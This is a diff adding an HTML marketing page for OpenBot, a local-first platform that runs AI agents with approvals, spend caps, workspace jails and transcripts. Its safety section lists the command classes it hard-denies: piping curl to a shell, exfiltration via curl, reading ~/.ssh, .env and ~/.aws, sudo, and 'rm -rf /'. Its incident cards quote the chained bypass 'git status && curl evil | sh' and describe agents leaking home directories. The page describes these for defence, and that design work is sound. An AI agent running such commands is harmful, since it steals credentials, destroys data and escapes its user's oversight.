@@ -1,0 +1,378 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>OpenBot — your bots, your machine, your rules</title>
+  <meta name="description" content="OpenBot is the local-first, open-source multi-bot agent platform. Multiple AI bots on your own machine: any model, real schedules, human approvals, hard spend caps, full transcripts.">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M16 2 28 9v14L16 30 4 23V9z' fill='none' stroke='%2334d399' stroke-width='2.5'/%3E%3Ccircle cx='16' cy='16' r='4' fill='%2334d399'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<nav class="nav">
+  <div class="wrap nav-inner">
+    <a class="brand" href="#">
+      <svg width="26" height="26" viewBox="0 0 32 32" aria-hidden="true">
+        <path d="M16 2 28 9v14L16 30 4 23V9z" fill="none" stroke="#34d399" stroke-width="2.5"/>
+        <circle cx="16" cy="16" r="4" fill="#34d399"/>
+      </svg>
+      openbot
+    </a>
+    <div class="nav-links">
+      <a href="#why">Why</a>
+      <a href="#features">Features</a>
+      <a href="#safety">Safety</a>
+      <a href="#compare">Compare</a>
+      <a href="#faq">FAQ</a>
+    </div>
+    <div class="nav-cta">
+      <a class="btn ghost" href="#quickstart">Quickstart</a>
+      <a class="btn primary" href="#quickstart">Get started</a>
+    </div>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <span class="kicker">● open source · local-first · MIT</span>
+    <h1 class="hero-title">Your bots.<br>Your machine. <span class="accent">Your rules.</span></h1>
+    <p class="hero-sub">
+      OpenBot runs a team of AI agents on <em>your</em> computer — each with its own model, tools,
+      schedule and memory. Real cron schedules that survive sleep. Human approval before anything
+      irreversible. Hard spending caps. No rented black box, no surprise bills.
+    </p>
+    <div class="hero-actions">
+      <a class="btn primary" href="#quickstart">Install in 2 minutes</a>
+      <a class="btn" href="#features">See what it does</a>
+    </div>
+    <p class="hero-note">Linux today · Python 3.11+ · works with OpenAI, Ollama, llama.cpp, LM&nbsp;Studio — or fully offline</p>
+
+    <div class="terminal" role="img" aria-label="Terminal session showing an openbot run pausing for human approval">
+      <div class="terminal-bar">
+        <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="title">openbot — tidy-downloads</span>
+      </div>
+      <div class="terminal-body"><span class="t-dim">$</span> <span class="t-cmd">openbot run tidy-downloads "sort this week's downloads"</span>
+<span class="t-blue">→ remember</span> {"key": "last-run", "value": "sort downloads"}
+<span class="t-blue">→ list_files</span> <span class="t-dim">42 files</span>
+<span class="t-warn">⏳ approval needed: move invoices/ → sorted/invoices/</span>
+   <span class="t-dim">resolve with</span> <span class="t-violet">openbot approvals approve apr_9f2…</span> <span class="t-dim">or --always</span>
+<span class="t-ok">✓</span> approved — continuing
+<span class="t-blue">→ shell</span> mv invoices/2026-09*.pdf sorted/invoices/
+<span class="t-ok">✓</span> moved 38 files · 4 needed a human look
+<span class="t-dim">run run_5c81… → </span><span class="t-ok">succeeded</span><span class="t-dim"> (steps=6, tokens≈2.1k)</span>
+<span class="t-prompt">$</span> <span class="cursor"></span></div>
+    </div>
+  </div>
+</header>
+
+<!-- ============================================================== WHY -->
+<section id="why">
+  <div class="wrap">
+    <div class="section-kicker">Why openbot exists</div>
+    <h2 class="section-title">Agent platforms keep failing the same ways. We designed against each one.</h2>
+    <p class="section-sub">
+      Every requirement below traces to a documented incident or top user complaint about today's
+      agent products — cloud and local. The receipts live in our
+      <a href="https://github.com/kevinarthur/openbot/blob/master/docs/research/complaints.md">complaints research</a>.
+    </p>
+
+    <div class="pain-grid">
+      <div class="pain-card">
+        <div class="incident">Documented incident</div>
+        <h3>"$447, silently billed"</h3>
+        <p>A coding-agent user found hundreds of dollars charged overnight by a runaway loop.
+        Cloud agents meter your money; you find out by invoice.</p>
+        <div class="fix"><b>openbot's answer</b> <span class="arr">→</span> per-run step caps, wall-clock kill switch,
+        and a daily token cap per bot — enforced by the engine, not the model's good behavior.</div>
+      </div>
+      <div class="pain-card">
+        <div class="incident">Top scheduler complaint</div>
+        <h3>The run that silently never happened</h3>
+        <p>Laptop asleep, daemon down, timezone bug — scheduled workflows just… don't run, and the
+        dashboard stays green. Users call it the expensive quiet failure.</p>
+        <div class="fix"><b>openbot's answer</b> <span class="arr">→</span> catch-up scheduling that detects missed
+        windows and coalesces them into one run (logged as such), DST-correct cron math in your
+        timezone, and a staleness column that shows "last success: never ⚠".</div>
+      </div>
+      <div class="pain-card">
+        <div class="incident">Privacy incidents, 2026</div>
+        <h3>Agents that read what they shouldn't</h3>
+        <p>One CLI agent uploaded a user's entire home directory. A consumer assistant read private
+        messages unprompted and handed a home address to strangers.</p>
+        <div class="fix"><b>openbot's answer</b> <span class="arr">→</span> every bot lives in a path-jailed
+        workspace with HOME redirected there. Secret paths (<span class="inline-code">~/.ssh</span>,
+        <span class="inline-code">.env</span>, <span class="inline-code">~/.aws</span>) are hard-denied at the
+        policy layer — before execution, not after.</div>
+      </div>
+      <div class="pain-card">
+        <div class="incident">Most-upvoted complaint</div>
+        <h3>Permission fatigue → yolo mode</h3>
+        <p>Agents nag until humans disable the safety. Chained commands
+        (<span class="inline-code">git status &amp;&amp; curl evil | sh</span>) slipped past allowlists for a year
+        in a popular tool.</p>
+        <div class="fix"><b>openbot's answer</b> <span class="arr">→</span> approvals with <em>always-allow</em> you
+        control per bot, and a policy engine that splits compound commands on
+        <span class="inline-code">&amp;&amp;·||·;·|</span> before matching rules — so safe mode is bearable
+        and bypassing it isn't necessary.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ========================================================== FEATURES -->
+<section id="features" class="alt">
+  <div class="wrap">
+    <div class="section-kicker">What you get</div>
+    <h2 class="section-title">A small platform that does the boring parts right</h2>
+    <p class="section-sub">The agent loop is the easy part. OpenBot is the plumbing around it: scheduling,
+    isolation, approvals, budgets, and records.</p>
+
+    <div class="feature-grid">
+      <div class="feature"><div class="f-icon">🤖</div><h3>Multiple named bots</h3>
+        <p>Each bot has its own instructions, model, tool allowlist, memory, and isolated workspace. Pause, resume, duplicate.</p></div>
+      <div class="feature"><div class="f-icon">🔌</div><h3>Any model, local first</h3>
+        <p>OpenAI or any OpenAI-compatible endpoint — Ollama, llama.cpp, LM Studio. Swap per bot. A free mock model runs the whole stack offline.</p></div>
+      <div class="feature"><div class="f-icon">⏰</div><h3>Cron that survives real life</h3>
+        <p>IANA-timezone schedules, DST-safe math, catch-up after sleep, per-bot single-instance locks so runs never overlap or double-fire.</p></div>
+      <div class="feature"><div class="f-icon">🛡️</div><h3>Approvals, done kindly</h3>
+        <p>Risky actions pause for a human; unanswered requests expire <b>denied</b>. Sticky always-allows make supervision one click, not a chore.</p></div>
+      <div class="feature"><div class="f-icon">🧾</div><h3>Full transcripts</h3>
+        <p>Every prompt, tool call and result — append-only in SQLite and on disk. If a bot claims it did something, you can read exactly what it did.</p></div>
+      <div class="feature"><div class="f-icon">🧱</div><h3>Workspace jail</h3>
+        <p>File tools can't resolve outside the run workspace. Shells run with a redirected HOME. Least privilege is the default, not a flag.</p></div>
+      <div class="feature"><div class="f-icon">🌐</div><h3>Browser that keeps logins</h3>
+        <p>Optional Playwright automation with a persistent profile per bot. CAPTCHA or MFA wall? The run pauses for a human instead of improvising.</p></div>
+      <div class="feature"><div class="f-icon">🧩</div><h3>Pluggable runtimes</h3>
+        <p>The built-in loop is ~300 auditable lines. Prefer an external harness? Bots can run under <b>Pi</b> (RPC) or <b>OpenCode</b> (headless) instead.</p></div>
+      <div class="feature"><div class="f-icon">💸</div><h3>Budgets with teeth</h3>
+        <p>Steps, wall-clock time, and tokens per day — per bot. When a cap trips, the run stops and the transcript tells you why.</p></div>
+      <div class="feature"><div class="f-icon">🖥️</div><h3>Dashboard + CLI</h3>
+        <p>A local web dashboard with live transcripts and one-click approvals, plus a full CLI for terminal people. Same engine underneath.</p></div>
+      <div class="feature"><div class="f-icon">🧠</div><h3>Memory that's inspectable</h3>
+        <p>Bots remember key facts across runs in plain SQLite rows you can read and delete. No opaque embedding soup in v1.</p></div>
+      <div class="feature"><div class="f-icon">📦</div><h3>Zero cloud required</h3>
+        <p>State in one directory you can back up or delete. No telemetry, no accounts, no phone-home. Your machine is the infrastructure.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================= STEPS -->
+<section id="how">
+  <div class="wrap">
+    <div class="section-kicker">How it works</div>
+    <h2 class="section-title">From install to supervised bot in three steps</h2>
+    <p class="section-sub">Starter templates cover the classics: a weekly research briefing, a repo
+    sweeper, and a downloads tidier that asks before it moves anything.</p>
+
+    <div class="steps">
+      <div class="step"><h3>Install &amp; init</h3>
+        <p><span class="inline-code">pipx install openbot</span> then <span class="inline-code">openbot init</span> —
+        creates the state directory and three template bots running on the free mock model.</p></div>
+      <div class="step"><h3>Point it at a model</h3>
+        <p><span class="inline-code">openbot bot update research-briefing --model ollama/llama3.2</span>
+        — or an OpenAI key, or a local llama.cpp server. Keep the mock model to explore safely.</p></div>
+      <div class="step"><h3>Supervise</h3>
+        <p><span class="inline-code">openbot serve</span> opens the dashboard: live transcripts, approval
+        queue, spend meters, and a big stop button. Or watch from the CLI.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- =========================================================== COMPARE -->
+<section id="compare" class="alt">
+  <div class="wrap">
+    <div class="section-kicker">Honest comparison</div>
+    <h2 class="section-title">Cloud agents are impressive. They're also not yours.</h2>
+    <p class="section-sub">OpenAI Dots, Grok Team Bots and Meta Muse pushed personal agents mainstream in
+    2026 — and proved the demand for what OpenBot does differently.</p>
+
+    <div class="compare-wrap">
+      <table class="compare">
+        <thead>
+          <tr>
+            <th></th>
+            <th class="openbot-col">openbot</th>
+            <th>OpenAI Dots</th>
+            <th>Grok Team Bots</th>
+            <th>Meta Muse</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>Runs where</td>
+            <td class="openbot-col yes">Your machine</td>
+            <td>OpenAI cloud</td><td>xAI cloud</td><td>Meta cloud</td></tr>
+          <tr><td>Models</td>
+            <td class="openbot-col yes">Any — local or hosted</td>
+            <td>GPT-6 family only</td><td>Grok only</td><td>Muse only</td></tr>
+          <tr><td>Works offline</td>
+            <td class="openbot-col yes">Yes (local models)</td>
+            <td class="no">No</td><td class="no">No</td><td class="no">No</td></tr>
+          <tr><td>Scheduling</td>
+            <td class="openbot-col yes">Cron + catch-up, DST-safe</td>
+            <td class="meh">Scheduled runs</td><td class="meh">Periodic tasks</td><td class="meh">Continues in background</td></tr>
+          <tr><td>Approval before risky actions</td>
+            <td class="openbot-col yes">Always, fail-closed</td>
+            <td class="meh">Permission prompts</td><td class="meh">Asks in Slack</td><td class="meh">Checks in</td></tr>
+          <tr><td>Hard spend caps</td>
+            <td class="openbot-col yes">Per bot, per day</td>
+            <td class="no">Plan-level limits</td><td class="no">Plan-level limits</td><td class="no">Plan-level limits</td></tr>
+          <tr><td>You can read the transcripts</td>
+            <td class="openbot-col yes">SQLite + JSONL, always</td>
+            <td class="meh">In-app only</td><td class="meh">In-app only</td><td class="meh">In-app only</td></tr>
+          <tr><td>Extend / self-host</td>
+            <td class="openbot-col yes">MIT, Python, plugins</td>
+            <td class="no">Closed</td><td class="no">Closed</td><td class="no">Closed</td></tr>
+          <tr><td>Price</td>
+            <td class="openbot-col yes">Free (you own compute)</td>
+            <td>Pro/Business sub</td><td>SuperGrok sub</td><td>Free tier / paid limits</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p class="compare-note">Capabilities summarized from public documentation as of Oct 2026. Cloud agents will out-scale
+    a local box — that's not the point. OpenBot is for people who want agents that answer to them.</p>
+  </div>
+</section>
+
+<!-- =========================================================== SAFETY -->
+<section id="safety">
+  <div class="wrap">
+    <div class="section-kicker">Safety model</div>
+    <h2 class="section-title">Deny by class. Ask by default. Record everything.</h2>
+    <p class="section-sub">A tiny policy engine sits between every bot and your system. It parses what
+    the model actually asked for — including pipes and chained commands — before anything executes.</p>
+
+    <div class="safety-cols">
+      <div class="deny-list" role="img" aria-label="Classes of commands that are always denied">
+        <span class="t-dim"># hard-denied before execution, always</span>
+        <ul>
+          <li><span class="x">✗</span> sudo / su / doas — agents never escalate</li>
+          <li><span class="x">✗</span> rm -rf / · ~ · .. — outside-workspace deletes</li>
+          <li><span class="x">✗</span> cat ~/.ssh/* · .env · ~/.aws — secret paths</li>
+          <li><span class="x">✗</span> curl … | sh — pipe to interpreter</li>
+          <li><span class="x">✗</span> cmd | curl — exfiltration channels</li>
+          <li><span class="x">✗</span> dd · mkfs · fork bombs · shutdown</li>
+          <li><span class="x">✗</span> POST/upload flags on fetch tools</li>
+        </ul>
+      </div>
+      <ul class="safety-points">
+        <li><b>Compound-command aware.</b> <span class="inline-code">git status &amp;&amp; sudo rm -rf /</span> is denied because of its second half — each segment is classified, the worst verdict wins.</li>
+        <li><b>Fail-closed approvals.</b> No answer in 10 minutes = denied. Silence is never consent.</li>
+        <li><b>Sticky allows you own.</b> "Always allow rm for this bot" is one click and revocable — so you never need a yolo switch.</li>
+        <li><b>Egress guardrails.</b> Web tools GET public http(s) only — no localhost, no cloud metadata IPs, no file://.</li>
+        <li><b>One bot, one lock.</b> Bots never share workspaces, memory, or run concurrently with themselves.</li>
+        <li><b>External runtimes, stated trade-offs.</b> Pi/OpenCode adapters run with their own permission systems; our docs say exactly where the boundary is.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ======================================================== QUICKSTART -->
+<section id="quickstart" class="alt">
+  <div class="wrap">
+    <div class="section-kicker">Quickstart</div>
+    <h2 class="section-title">Two minutes, no API key</h2>
+    <p class="section-sub">The mock model exercises the entire pipeline — scheduling, tools, approvals,
+    transcripts — offline and free. Swap in a real model when you're ready.</p>
+
+    <div class="quickstart">
+      <div class="qs-body"><span class="qs-comment"># install (or: pipx install openbot / uv tool install openbot)</span>
+pip install openbot
+
+<span class="qs-comment"># create state + starter bots (research-briefing, repo-sweeper, tidy-downloads)</span>
+openbot init
+
+<span class="qs-comment"># explore offline with the mock model — then point at something real</span>
+openbot run research-briefing "summarize this week's AI news"
+openbot bot update research-briefing --model <span class="t-blue">ollama/llama3.2</span>   <span class="qs-comment"># or openai/gpt-4o-mini</span>
+
+<span class="qs-comment"># dashboard: live transcripts, approvals, spend meters</span>
+openbot serve                <span class="qs-comment"># → http://127.0.0.1:8787</span>
+
+<span class="qs-comment"># leave it running (schedules, dispatch, approval expiry)</span>
+openbot daemon</div>
+    </div>
+  </div>
+</section>
+
+<!-- =============================================================== FAQ -->
+<section id="faq">
+  <div class="wrap">
+    <div class="section-kicker">FAQ</div>
+    <h2 class="section-title">Fair questions</h2>
+
+    <div class="faq-item"><details>
+      <summary>Do I need an API key or a GPU?</summary>
+      <p>No. The bundled mock model runs the full pipeline offline — it exists for exactly this. When you want real
+      intelligence, any OpenAI-compatible endpoint works: an OpenAI key, or Ollama/llama.cpp on CPU (7B-class models
+      are fine for many tasks). A GPU just makes local models faster.</p>
+    </details></div>
+
+    <div class="faq-item"><details>
+      <summary>Does openbot phone home?</summary>
+      <p>No telemetry, no accounts, no update checks. All state lives in one directory
+      (<span class="inline-code">~/.local/state/openbot</span>) you can inspect, back up, or rm. The only network
+      traffic is what your bots explicitly fetch, gated by the policy engine.</p>
+    </details></div>
+
+    <div class="faq-item"><details>
+      <summary>What happens when a bot hits a CAPTCHA or MFA wall?</summary>
+      <p>It stops and says so — the run emits a pause-to-human event and waits. Bots never attempt to solve
+      challenges or click "I am not a robot". Persistent browser profiles mean logins survive between runs, so
+      walls get rarer over time.</p>
+    </details></div>
+
+    <div class="faq-item"><details>
+      <summary>Why build your own agent loop instead of using a framework?</summary>
+      <p>Because the parts users actually need — scheduling, approvals, budgets, isolation, transcripts — are
+      exactly what agent frameworks don't provide, and 2026 post-mortems keep showing multi-agent frameworks
+      being overkill for scheduled local work. OpenBot's loop is a few hundred auditable lines; if you prefer an
+      external harness, bots can run under Pi or OpenCode via adapters.</p>
+    </details></div>
+
+    <div class="faq-item"><details>
+      <summary>Is this production-grade autonomy?</summary>
+      <p>No, and it doesn't pretend to be. It's an MVP with honest boundaries: a supervising human is part of the
+      design, external sites may block automation, and models can be wrong. What it promises is that failures are
+      <em>visible, capped, and reversible</em> — every action logged, every cap enforced, every risky step yours to veto.</p>
+    </details></div>
+  </div>
+</section>
+
+<!-- =============================================================== CTA -->
+<section class="cta-band" id="get">
+  <div class="wrap">
+    <h2>Stop renting your agents.</h2>
+    <p>Free, open source, and answerable to you — not to a plan tier.</p>
+    <a class="btn primary" href="#quickstart">Get started now</a>
+    <a class="btn" href="https://github.com/kevinarthur/openbot">Read the source</a>
+  </div>
+</section>
+
+<footer class="site">
+  <div class="wrap">
+    <div class="footer-cols">
+      <a class="brand" href="#">
+        <svg width="22" height="22" viewBox="0 0 32 32" aria-hidden="true">
+          <path d="M16 2 28 9v14L16 30 4 23V9z" fill="none" stroke="#34d399" stroke-width="2.5"/>
+          <circle cx="16" cy="16" r="4" fill="#34d399"/>
+        </svg>
+        openbot
+      </a>
+      <nav>
+        <a href="#why">Why</a>
+        <a href="#features">Features</a>
+        <a href="#safety">Safety</a>
+        <a href="#compare">Compare</a>
+        <a href="https://github.com/kevinarthur/openbot">GitHub</a>
+        <a href="https://github.com/kevinarthur/openbot/tree/master/docs">Docs</a>
+      </nav>
+    </div>
+    <p class="footer-tag">MIT licensed · built because agents deserve better plumbing · competitor references are
+    summarized from public documentation &amp; user reports, Oct 2026</p>
+  </div>
+</footer>
+
+</body>
+</html>
